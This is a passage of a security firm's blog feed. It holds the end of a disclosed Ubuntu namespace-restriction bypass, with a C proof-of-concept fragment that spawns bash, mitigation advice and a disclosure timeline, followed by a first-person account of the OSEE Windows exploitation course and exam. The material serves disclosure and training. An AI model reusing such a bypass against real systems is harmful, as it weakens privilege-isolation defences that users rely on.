    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;func_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;func_2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;6-mitigation&quot;&gt;6. Mitigation&lt;/h2&gt;

&lt;p&gt;The bypass method works only when &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/sys/kernel/apparmor_restrict_unprivileged_unconfined&lt;/code&gt; is disabled (i.e., set to 0). Versions of Ubuntu later than 25.04 are not affected, as it is enabled by default.&lt;/p&gt;

&lt;p&gt;For Ubuntu 24.10 and earlier versions, please refer the &lt;a href=&quot;https://discourse.ubuntu.com/t/understanding-apparmor-user-namespace-restriction/58007#p-148026-restrict-unprivileged-unconfined-profile-changes&quot;&gt;official post&lt;/a&gt; for instructions on how to prevent any unprivileged and unconfined process from executing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa-exec&lt;/code&gt; to change its profile.&lt;/p&gt;

&lt;h2 id=&quot;7-disclosure-timeline&quot;&gt;7. Disclosure Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;2025-02-16: Researcher @roddux mentioned that the namespace restriction is easy to bypass.&lt;/li&gt;
  &lt;li&gt;2025-02-17: I discovered the bypass method.&lt;/li&gt;
  &lt;li&gt;2025-02-24: I reported the issue to the ZDI team.&lt;/li&gt;
  &lt;li&gt;2025-03-21: Researcher @roddux published his bypass method.&lt;/li&gt;
  &lt;li&gt;2025-03-27: The Qualys team, upon noticing @roddux’s publication, also disclosed their advisory.&lt;/li&gt;
  &lt;li&gt;2025-04-27: The ZDI team responded that they are not interested in this type of bug.&lt;/li&gt;
  &lt;li&gt;2025-04-30: I reported the issue to the Ubuntu Security Team.&lt;/li&gt;
  &lt;li&gt;2025-05-01: John, one of the maintainers, notified me that it had entered the initial review stage.&lt;/li&gt;
  &lt;li&gt;2025-05-30: John provided a full analysis of the issue.&lt;/li&gt;
  &lt;li&gt;2025-06-26: Coordinated release.&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2025/06/26/the-journey-of-bypassing-ubuntus-unprivileged-namespace-restriction-en/</link>
                <guid>https://devco.re/blog/2025/06/26/the-journey-of-bypassing-ubuntus-unprivileged-namespace-restriction-en</guid>
                <pubDate>Thu, 26 Jun 2025 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>OSEE Exam Uncovered: Cracking OSEE in Taipei</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2025/05/27/osee-exam-uncovered-cracking-osee-in-taipei/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2025/05/22/exp-401-osee-five-days-to-master-a-decade-of-knowledge/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In August 2024, DEVCORE and OffSec held a live training event in Taipei, offering four courses: SOC-200, WEB-200, PEN-200, and EXP-401. This was the first time OffSec held a live training in Taiwan.&lt;/p&gt;

&lt;p&gt;Naturally, the course I was most interested in was EXP-401, also known as Advanced Windows Exploitation (AWE). Most people know it by its certification name, “OSEE.”&lt;/p&gt;

&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;OSEE is considered OffSec’s hardest certification. As of now, only about 100–200 people worldwide hold this certification, and the pass rate is around 10%. We’ve always been curious just how tough this legendary cert really is. After all, how hard could a certification be?&lt;/p&gt;

&lt;p&gt;At DEVCORE, we started early on by asking how many people in Taiwan would be interested if an OSEE course were available locally. My first thought was: “Even if I have to dig into my pockets, I’m in!”  The reasons were simple:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;OSEE is &lt;strong&gt;only offered in-person&lt;/strong&gt;, with no online version available&lt;/li&gt;
  &lt;li&gt;In the past, attending this course meant &lt;strong&gt;having to go abroad&lt;/strong&gt;, with the most well-known session being the annual Black Hat USA training.&lt;/li&gt;
  &lt;li&gt;It’s extremely hard to sign up, and some people even write scripts to secure their seats.&lt;/li&gt;
  &lt;li&gt;Regardless of exam results, it would be a first for Taiwan: either the first OSEE holder or the first to fail, both an achievement.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;OffSec’s official site has a page listing all their live training sessions: &lt;a href=&quot;https://www.offsec.com/training-and-events/&quot;&gt;Upcoming Live Training &amp;amp; Events | OffSec&lt;/a&gt;. The most well-known EXP-401 session is held every August at Black Hat USA in Las Vegas. Rough math says that the round-trip airfare from Taipei to Vegas plus hotel for the week costs a small fortune, so taking the class in Taipei easily saves more than NT$100k on travel alone. Absolutely worth it.&lt;/p&gt;

&lt;p&gt;All things considered, I think this was the best training course I’ve ever attended, and I highly recommend it. Even if you’re not focused on Windows research, you will still enjoy it. The goal needn’t be earning the OSEE (though passing would be awesome) certification. The class experience itself is fantastic.&lt;/p&gt;

&lt;h2 id=&quot;course-overview&quot;&gt;Course Overview&lt;/h2&gt;

&lt;p&gt;EXP-401 (OSEE) is the only “Expert-level” course from OffSec, and it’s widely recognized as the most difficult certification with the lowest pass rate. You can find its position in Paul Jerimy’s &lt;a href=&quot;https://pauljerimy.com/security-certification-roadmap/&quot;&gt;Security Certification Roadmap&lt;/a&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250522/upload_8c455085eb6be1da05d6f11ed8b5ad8a.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;EXP-401 is focused on advanced “Windows exploitation techniques.” Modern Windows systems are equipped with various security mitigations (e.g., DEP, ASLR, CFG, ACG, CET), and the course walks students through bypassing these protections, developing working exploits in environments with single or multiple protections enabled. Some highlights of the course include:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;In-person only&lt;/strong&gt;: Unlike other OffSec courses, this one is not available online. The instructor relies heavily on interacting with students, so physical presence is required.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Real-world focus&lt;/strong&gt;: The course uses real-world enterprise-level applications like VMware and Edge as targets for analysis.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Deep Windows content&lt;/strong&gt;: Topics include user-mode and kernel-mode exploitation, advanced heap manipulation, VM escape, sandbox escape, and kernel driver reverse engineering.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;72-hour exam challenge&lt;/strong&gt;: OSEE has the longest exam duration of all OffSec certifications. You’re given two zero-day-style challenges and must develop full working exploits and submit a &lt;strong&gt;detailed report&lt;/strong&gt;, complete with steps and screenshots, within 72 hours.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Although the course recommends familiarity with WinDBG, IDA Pro, x86/x64 assembly, and C/C++, I found that only basic knowledge is needed. The course doesn’t throw overly complex scenarios at you, and any reverse engineering tasks are quite straightforward. The focus is definitely on &lt;strong&gt;writing and refining exploits&lt;/strong&gt;, not deep reverse engineering. So rather than pure RE skills, having experience in &lt;strong&gt;binary exploitation&lt;/strong&gt; (on Windows or Linux) will be far more helpful.&lt;/p&gt;

&lt;h2 id=&quot;before-class&quot;&gt;Before Class&lt;/h2&gt;

&lt;p&gt;After registering, OffSec sends a preparation email detailing the hardware and software requirements. For example, your machine must support NX, SMEP, and VT-x/EPT to ensure you can test all protection mechanisms discussed in class. VMware content (now removed in the latest version) also required nested virtualization, plenty of disk, and RAM.&lt;/p&gt;

&lt;p&gt;Besides, I suggest bringing an extra portable monitor. While remote-debugging a VM, you also need to view slides or tweak exploits in Visual Studio. The constant window-switching is really distracting.&lt;/p&gt;

&lt;p&gt;The mail also contained plenty of reading on concepts and techniques that would be discussed during the class, such as DEP/ASLR/CFG bypass, Windows mitigations, type confusion vulnerabilities, SMEP, token stealing, LFH, and more.&lt;/p&gt;

&lt;h2 id=&quot;class-experience&quot;&gt;Class Experience&lt;/h2&gt;

&lt;p&gt;The course ran at GIS Taipei Tech Convention Center for five consecutive days, 9 AM–6 PM.
I saw a gigantic textbook on each desk when I walking in.
&lt;img src=&quot;/assets/img/blog/20250522/upload_ab82acf8bee146b377b3bc70ff60b756.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It’s about 600 pages, 3.6 cm thick:
&lt;img src=&quot;/assets/img/blog/20250522/upload_17fdc7d6f806d28d3cb313584b4fe4ec.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In short: &lt;em&gt;huge&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Food and snacks were provided daily. You only had to worry about learning (and bathroom breaks).
Our instructors were &lt;a href=&quot;https://dz.linkedin.com/in/nassereddine-abdelli?trk=public_post_feed-actor-name&quot;&gt;Nassereddine ABDELLI&lt;/a&gt;(&lt;a href=&quot;https://x.com/n4sr0&quot;&gt;@n4sr0&lt;/a&gt;)and &lt;a href=&quot;https://lb.linkedin.com/in/victor-khoury&quot;&gt;Victor Khoury&lt;/a&gt;(&lt;a href=&quot;https://github.com/V-i-x-x&quot;&gt;Vixx&lt;/a&gt;), they are very experienced and interacted constantly, tossing questions to ensure everyone kept up. Even unexpected questions were answered live with hands-on demos. I think that’s why live training is better than online courses: you can really squeeze every bit of knowledge out of the instructors.&lt;/p&gt;

&lt;p&gt;During the five days, two “&lt;strong&gt;Extra Miles&lt;/strong&gt;” challenges were offered. Completing each of them during the week can earn you a challenge coin. There were also small Q\&amp;amp;A quizzes for stickers.&lt;/p&gt;

&lt;p&gt;Near the end of day 1, the instructors impulsively added a mini-challenge: solve an ROP chain in 45 minutes to win a coin. No one succeeded. Orange or Lays joked, “Almost all of Taiwan’s Microsoft Top 100 hackers are here, and still no one cracked it.” It looks like OSEE really is tough.&lt;/p&gt;

&lt;h3 id=&quot;day-1&quot;&gt;Day 1&lt;/h3&gt;

&lt;p&gt;We received slides, VMs, and a brief course intro. The most quoted slide online is probably this one:
&lt;img src=&quot;/assets/img/blog/20250522/upload_7b077d2f6c8d86426a5aa31a1876449b.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It warned that the difficulty would ramp up dramatically, though I personally felt it wasn’t that extreme. Perhaps this is because these topics (VM, browser, kernel) are everyday fare for vulnerability researchers or just because CTF players are more reluctant.&lt;/p&gt;

&lt;p&gt;A fun Easter egg: a samurai appears at the top of the slides and gradually loses his armor as the course progresses. Its helmet turns into a straw hat, and weapons vanish until he’s just naked. It possibly symbolizes the mystery of Windows being stripped away one by one.&lt;/p&gt;

&lt;p&gt;The first half of the day was a warm-up: Win32 APIs, x64 shellcode, etc. Then, we dove into VMware internals, starting with protections like DEP and ASLR and how to bypass them using ROP. We then explored how VMware Workstation works under the hood.&lt;/p&gt;

&lt;p&gt;I was super impressed with the course materials. It’s clear that the team behind it consists of highly skilled researchers. The training manual is the crystallization of their careful study and organization. As a result, the content is filled with references. If you’re interested in exploring the original research in more depth, you can easily find further reading materials by following the references provided in the book.&lt;/p&gt;

&lt;p&gt;By the end of the day, I realized I really needed that second screen, so I bought one at the Syntrend that night.&lt;/p&gt;

&lt;h3 id=&quot;day-2&quot;&gt;Day 2&lt;/h3&gt;

&lt;p&gt;We continued with VMware Workstation content. The exploitation is related to the heap, so the day started with Windows Heap internals.&lt;/p&gt;

&lt;p&gt;Then, go into bypassing ASLR, stack pivoting, and defeating DEP. This part really highlighted the course’s practical value. Unlike CTFs (where stability isn’t essential) or Pwn2Own (where a “One Shot” is enough), this course demands stability. After exploit execution, VMware and Windows must keep running like nothing happened: no crashing, no freezing. (You can’t cheat by freezing the program with a sleep loop.)&lt;/p&gt;

&lt;p&gt;The afternoon shifted to the Edge browser, specifically Chakra Edge, not the current Chromium Edge. The instructors chose Chakra because it enables more native mitigations, letting us practice more Windows exploits. Pure “browser PWNs” would deserve their own course. Nonetheless, we learned core concepts: type confusion, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addressof&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fakeobj&lt;/code&gt;, and crucial debugging workflows.&lt;/p&gt;

&lt;p&gt;Although we haven’t yet delved deeply into the browser-related parts today, the instructor gave us our first Extra Mile challenge: &lt;strong&gt;use ROP to bypass CFG and achieve a sandbox escape exploit&lt;/strong&gt;. (In class, we learned about scenarios with CET enabled, where even ROP would fail.)&lt;/p&gt;

&lt;p&gt;It might sound straightforward, but the instructor specifically required us to wrap the vulnerability into a function that allows ROP to be triggered repeatedly. This approach brings more discipline to the exploit development process and significantly improves development efficiency.&lt;/p&gt;

&lt;p&gt;Of course, there were other challenges to overcome as well, like figuring out how to obtain usable memory addresses. But because I wanted that coin so desperately, I read ahead 100+ pages that we hadn’t even covered yet and started building the exploit. I stayed up until 5 AM but still hadn’t nailed it.&lt;/p&gt;

&lt;h3 id=&quot;day-3&quot;&gt;Day 3&lt;/h3&gt;

&lt;p&gt;Day 3 of the course was entirely focused on Edge, and it was the most fascinating part of the class for me.&lt;/p&gt;

&lt;p&gt;We started with a Type Confusion vulnerability, and the instructor walked us step-by-step through how to manipulate JavaScript objects in Edge to gain control over the RIP (instruction pointer). From there, we moved into a series of modern defense mechanisms, and each time a new mitigation was introduced, we immediately learned how to bypass it. First, we circumvented &lt;strong&gt;Control Flow Guard (CFG)&lt;/strong&gt;, then &lt;strong&gt;Control-Flow Enforcement Technology (CET)&lt;/strong&gt;, followed by &lt;strong&gt;Arbitrary Code Guard (ACG)&lt;/strong&gt;, and finally, we broke out of the browser’s &lt;strong&gt;low-privileged sandbox&lt;/strong&gt; to execute high-privilege commands on Windows.&lt;/p&gt;

&lt;p&gt;Throughout the process, we not only learned about the protection mechanisms present in modern Windows systems but also gained a deep understanding of their limitations and the techniques to bypass them.&lt;/p&gt;

&lt;p&gt;Even though the material covered in class didn’t exactly follow the same path as the &lt;strong&gt;Extra Mile&lt;/strong&gt; challenges, I managed to complete the &lt;strong&gt;ROP sandbox escape&lt;/strong&gt; challenge during the lectures, making me the &lt;strong&gt;first to earn a challenge coin&lt;/strong&gt;! (though its serial number looked ominous in Mandarin, which means die together):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250522/upload_83ad2122816ba37db84d7750df28350a.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Later that day, we got the final Extra Mile challenge, this time focused on &lt;strong&gt;Kernel Mode&lt;/strong&gt;: From &lt;strong&gt;Low Integrity&lt;/strong&gt;, exploit a known CVE to launch a high-privilege &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmd.exe&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The tricky part here is that, due to the Low Integrity level, you couldn’t use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NtQuerySystemInformation&lt;/code&gt; to leak kernel addresses. Additionally, the CVE provided during class requires writing a file to complete the exploit, so we have to find a directory where a Low Integrity process can &lt;strong&gt;successfully write files&lt;/strong&gt; in order to place our payload and carry out the attack.&lt;/p&gt;

&lt;p&gt;But… I’ve decided to reward myself with a good night’s sleep tonight, so I’ll just ignore that Extra Mile for now.&lt;/p&gt;

&lt;h3 id=&quot;days-45&quot;&gt;Days 4–5&lt;/h3&gt;

&lt;p&gt;The final two days focused on &lt;strong&gt;kernel mode&lt;/strong&gt;: driver and Win32k exploitation, token stealing, ACL NULL-ing, SMEP, page tables, KVA shadow, VBS, kCFG, and more. Stability and clean restoration after exploitation were paramount. Crashing the OS is not acceptable.&lt;/p&gt;

&lt;p&gt;Despite five long days, the room only grew more excited. As Lays put it, “Nobody usually cares about Windows, so five straight days on it is a blast.” By the end, people were literally standing around the instructors, watching live demos of WinDBG and exploit fixes. The energy stayed high right through the final minute.&lt;/p&gt;

&lt;p&gt;I ended up earning both challenge coins. But rumor has it that a student got overconfident from winning both challenge coins and didn’t study enough for the exam… which made me a little nervous too.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250522/upload_29009efc9ab35f26cdb952f962900dfb.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;post-class-reflections&quot;&gt;Post-Class Reflections&lt;/h2&gt;

&lt;h3 id=&quot;immersive-flow&quot;&gt;Immersive Flow&lt;/h3&gt;

&lt;p&gt;The week-long in-person training was an incredibly immersive flow-state experience. For five full days, my entire world revolved around Windows exploitation, there was barely room for anything else. With the Extra Miles reward system in place, I felt like I was even writing exploits in my dreams.&lt;/p&gt;

&lt;p&gt;To ensure system stability and maximize development speed, I had to carefully choose the right exploitation approaches from the beginning. That also meant cultivating solid coding habits. This not only improved debugging clarity but also reduced future errors and saved time revisiting concepts.&lt;/p&gt;

&lt;h3 id=&quot;learning-resources&quot;&gt;Learning Resources&lt;/h3&gt;

&lt;p&gt;A common question I get in my DMs is whether there’s a recommended learning path for EXP-401. Should you take any prerequisite courses or study specific materials? Honestly, the course itself is comprehensive enough that no additional preparation is strictly necessary. But if you’re still unsure whether it’s the right fit for you, here are a few free resources to test the waters:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https://github.com/hacksysteam/HackSysExtremeVulnerableDriver&quot;&gt;HackSys Extreme Vulnerable Driver (HEVD)&lt;/a&gt;:&lt;/strong&gt; A purposely vulnerable Windows driver project, great for practicing kernel-mode exploitation.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https://p.ost2.fyi/&quot;&gt;OpenSecurityTraining2&lt;/a&gt;:&lt;/strong&gt; A fantastic collection of free courses created by security researchers, covering topics like x86-64 OS Internals and WinDbg basics.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;These are high-quality, well-maintained resources often used by beginners to build a solid foundation. (Although personally, I’ve spent less than two hours on them in total.)&lt;/p&gt;

&lt;p&gt;For more advanced learners, try reproducing 1-day exploits with public write-ups. For example, I wrote a full exploit for one Win32k vulnerability covered in the course a year or two ago, albeit not very stable. Researchers like Angelboy have also written about some of the more challenging vulnerabilities mentioned in the course. Reproducing these is an excellent way to learn the whole process of exploit development: gathering information, locating the bug, bypassing protections, and understanding unique Windows mechanisms.&lt;/p&gt;

&lt;h3 id=&quot;value-of-the-course&quot;&gt;Value of the Course&lt;/h3&gt;

&lt;p&gt;EXP-401 is essentially a carefully distilled, high-quality crash course by OffSec, offering insights rarely found in public resources. For those in research, you’ll know that even when you’re aware of certain protections or system designs, diving into their actual implementations often requires starting from scratch, which means collecting scattered documentation, reading code, and reasoning through endless trial and error.&lt;/p&gt;

&lt;p&gt;When trying to understand a large and complex system, you often face a similar challenge: the system contains many critical components and mechanisms, but the relevant research is usually scattered across more than a decade of material. The first step is to invest time into searching for and organizing past research, gradually mapping out how these components interact. Only then can you begin to understand under what conditions each mechanism might fail, and eventually piece together a coherent, complete picture. Research results derived from this kind of deep, painstaking synthesis are rarely shared openly.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;EXP-401&lt;/strong&gt;, however, distills that level of research into a course and shares it with participants with no holding back. Starting from the earliest days of DEP, each subsequent defense mechanism is layered on top of the last. The course walks you step-by-step through this historical evolution. What problem was each layer of protection designed to solve? How did attackers eventually find ways to bypass it?&lt;/p&gt;

&lt;p&gt;By the end of the course, students gain a clear mental map of the Windows ecosystem. You learn how and why each mitigation was introduced, how it works, how it’s bypassed, and where its weaknesses lie. This isn’t just about writing exploits. It’s about truly understanding the underlying story and logic of Windows internals.&lt;/p&gt;

&lt;h3 id=&quot;is-the-course-still-relevant-today&quot;&gt;Is the Course Still Relevant Today?&lt;/h3&gt;

&lt;p&gt;The EXP-401 course primarily centers on &lt;strong&gt;Windows security mechanisms and exploitation techniques&lt;/strong&gt;, with minimal focus on outdated technologies. As a result, the protection mechanisms introduced throughout the course are all still &lt;strong&gt;relevant and effective in modern Windows systems&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Beyond just explaining the security mechanisms, the course is supplemented with various &lt;strong&gt;supporting materials&lt;/strong&gt;. These materials aren’t meant to simulate real-world environments perfectly but to illustrate different scenarios and stimulate critical thinking about exploitation strategies. For example, the course uses a version of &lt;strong&gt;Microsoft Edge with the Chakra engine&lt;/strong&gt;. While Chakra-based Edge is no longer in use today, it still serves as a valuable case study from the perspective of &lt;strong&gt;Windows-level protections&lt;/strong&gt;. That’s because, regardless of the browser in question, once a vulnerability is found, the &lt;strong&gt;system-level challenges&lt;/strong&gt; faced during exploit development remain largely the same.&lt;/p&gt;

&lt;p&gt;Of course, the &lt;strong&gt;in-browser challenges&lt;/strong&gt; do differ between browsers. For instance, Chrome introduces an additional layer of complexity with its own custom &lt;strong&gt;sandboxing mechanism&lt;/strong&gt;, which adds application-specific hurdles. But it’s important to understand that &lt;strong&gt;unless this course were specifically about browser exploit development&lt;/strong&gt;, it’s unrealistic to expect deep coverage of browser-specific defenses.&lt;/p&gt;

&lt;p&gt;In summary, if your focus is strictly on &lt;strong&gt;Windows OS-level protection mechanisms and exploitation techniques&lt;/strong&gt;, the content of &lt;strong&gt;EXP-401 remains highly relevant and applicable even today&lt;/strong&gt;.&lt;/p&gt;

&lt;h3 id=&quot;will-it-help-you-get-a-job&quot;&gt;Will It Help You Get a Job?&lt;/h3&gt;

&lt;p&gt;Short answer: &lt;strong&gt;It helps, but not significantly&lt;/strong&gt;. Here’s why:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;If you’re aiming for red teaming:&lt;/strong&gt; Holding the OSEE alone doesn’t prove much unless you also demonstrate a red team mindset. Exploit skills help, but thinking like an adversary matters more.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;If you’re aiming for security research:&lt;/strong&gt; OSEE is only an entry badge. Getting the OSEE only shows you can handle some technical problems, but real research is about driving your own projects and solving novel problems independently.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As a researcher myself, I’d say certifications aren’t essential. Research quality is proven through results and published work, not certs. But before reaching that point, you need a solid knowledge base. And that’s where EXP-401 really shines.&lt;/p&gt;

&lt;p&gt;In a way, EXP-401 is like tracing a master’s artwork. You follow in the footsteps of top researchers, learning how protections are introduced, understood, and bypassed. You gain not just technical skills but also the thought process and methodology behind real-world vulnerability research. These skills translate well beyond Windows. It can also be applied to IoT, Linux, macOS research, and more.&lt;/p&gt;

&lt;p&gt;So yes, the course is more valuable than the cert alone. But if you’re paying for it, might as well earn that cert too.&lt;/p&gt;

&lt;h2 id=&quot;report-writing&quot;&gt;Report Writing&lt;/h2&gt;

&lt;p&gt;As mentioned earlier, the OSEE exam consists of two challenges. OffSec has designed a series of vulnerabilities for this purpose, and to simulate real-world scenarios, each vulnerability is accompanied by corresponding CVE advisories and simulated blog posts. The blog posts mainly introduce how the program works and methods previously used to exploit, while the CVE advisories describe the type of vulnerability but do not specify the exact location, trigger method or provide a PoC. Candidates must rely on these clues to reverse-engineer the binaries, identify the vulnerabilities, write code to trigger them, and ultimately bypass all protection mechanisms to read the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;proof.txt&lt;/code&gt; file in order to complete the challenge.&lt;/p&gt;

&lt;p&gt;The exam time is arranged as: &lt;strong&gt;72 hours to complete the exploit, 24 hours to complete the report&lt;/strong&gt;. However, in practice, time is far less abundant than it seems. This will be explained later.&lt;/p&gt;

&lt;p&gt;The specific grading criteria can be found in the official OSEE report template: &lt;a href=&quot;https://offensive-security.com/awe/AWE-Exam-Report.docx&quot;&gt;AWE-Exam-Report.docx&lt;/a&gt;. Each challenge is worth 50 points. Completing only half of a challenge will only earn 25 points, and the passing score is 75 points. For example, according to the first question in the report template, if you achieve code execution but fail to complete sandbox escape, you only get 25 points. Similarly, for the second question, if you achieve Read/Write Primitive but fail to escalate privileges, you also only get 25 points.&lt;/p&gt;

&lt;p&gt;Although I completed the course in August last year, I was way too busy to schedule the exam. In September and October, I was mainly focused on researching Pwn2Own targets (eventually successfully exploiting AeoTec). At the end of the year, I was preparing for a CCC talk, followed by SITCON at the beginning of the year, and then DEVCORE Conf in March. In the end, I barely managed to squeeze in an OSEE exam on 2/24.&lt;/p&gt;

&lt;p&gt;The exam started at 8:00 AM. I quickly achieved code execution for the first question and earned 25 points. However, I overlooked a detail and got stuck on sandbox escape. So, the next day, I switched to the second question and solved it around 2:00 PM, earning 50 points. I spent the remaining half-day grinding on the first question and finally beat it at 2:00 AM. We were talking about being the first in Taiwan to get an OSEE, but now I think it makes more sense to aim for an “OSEE Speedrun.” I basically lived a normal life during those few days (aside from having a camera pointed at my dumb face, it was fairly normal) and even had time to practice piano. If I hadn’t messed up on the first day, finishing in a day seemed possible.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Timeline
    &lt;ul&gt;
      &lt;li&gt;2/24 08:00:00: Exam started at 8:00 AM&lt;/li&gt;
      &lt;li&gt;2/25 14:04:52: Solved the second question&lt;/li&gt;
      &lt;li&gt;2/26 02:41:43: Solved the first question, completed the exam&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The rest of the time was spent focusing on writing the report.&lt;br /&gt;
As mentioned earlier, candidates must &lt;strong&gt;complete the exploit within 72 hours&lt;/strong&gt;, and then &lt;strong&gt;complete the report within the next 24 hours&lt;/strong&gt;. However, in reality, the time is not nearly as sufficient as it seems, because the OSEE report requirements are extremely strict.&lt;/p&gt;

&lt;p&gt;Take the official template &lt;a href=&quot;https://offensive-security.com/awe/AWE-Exam-Report.docx&quot;&gt;AWE-Exam-Report.docx&lt;/a&gt; for example, you’ll see that the entire structure is meticulously detailed, with sections like “2.2 Initial Exploitation”, “2.3 Read and Write Primitive”, “2.4 Code Execution”, “2.5 Sandbox Escape”, and so on.&lt;/p&gt;

&lt;p&gt;When we write exploits normally, we usually just proceed linearly and rarely document every intermediate step. However, you have to break down each stage clearly during the exam. Not only must you explain how you exploited the vulnerability, but you must also provide concrete proof of bypassing protection mechanisms, along with copy-paste-ready code. For example, in the “Read and Write Primitive” stage, you might just check this in passing and move on in normal dev flow. But in the report, you must prove you can do this. A common approach is to write a small PoC that reads/writes an inaccessible memory region, with debugger screenshots as supporting evidence.&lt;/p&gt;

&lt;p&gt;However, the &lt;strong&gt;exam machine is only available for 72 hours, and all data downloads are prohibited&lt;/strong&gt;. This means that if you don’t collect all the required screenshots, evidence, and intermediate steps within those 72 hours, writing the report later will be extremely painful, and you might even fail due to lack of evidence. Therefore, it’s impossible to write the report afterward by trying to break down the PoC into stages cause you’ll be missing necessary screenshots and won’t be able to verify if the PoC still works. The safest strategy is: Within 72 hours, not only complete the exploit but also simultaneously write PoCs, gather all data, and draft the main content of the report.&lt;/p&gt;

&lt;p&gt;There have been cases where candidates scored a full 100 points during the exploit phase but failed the exam because the report was not detailed enough. So, I was terrified and submitted a 100-page report.&lt;/p&gt;
&lt;h2 id=&quot;final-thoughts&quot;&gt;Final Thoughts&lt;/h2&gt;

&lt;p&gt;At the time, the exam didn’t feel that hard. Some may have seen &lt;a href=&quot;https://www.facebook.com/share/p/16W1Jo4eqp/&quot;&gt;Xu Muyuan’s post&lt;/a&gt; about the low pass rate, but for anyone who dares to call themselves a researcher, this exam should be easy enough to make you laugh.&lt;/p&gt;

&lt;p&gt;Once I submitted everything, I waited for OffSec to review it. They say it can take up to 10 business days. I finally got the pass notification on March 10.&lt;/p&gt;

&lt;p&gt;It’s rumored that this is the &lt;strong&gt;first OSEE certification in Taiwan&lt;/strong&gt;, so… achievement is unlocked!
&lt;img src=&quot;/assets/img/blog/20250522/upload_b03d6106afb193bc29194272198cf43b.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A bit sad that OffSec no longer sends physical certificates or cards. I really wanted a physical OSEE card for the memories. I still have my OSCP card, which is a treasured keepsake.&lt;/p&gt;

&lt;h2 id=&quot;bonus-upcoming-live-training-by-devcore-august-2025&quot;&gt;Bonus: Upcoming live training by DEVCORE (August 2025)&lt;/h2&gt;

&lt;p&gt;DEVCORE will once again host OffSec’s  live training this August, offering:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;PEN-300:&lt;/strong&gt; Advanced Evasion Techniques&lt;/li&gt;
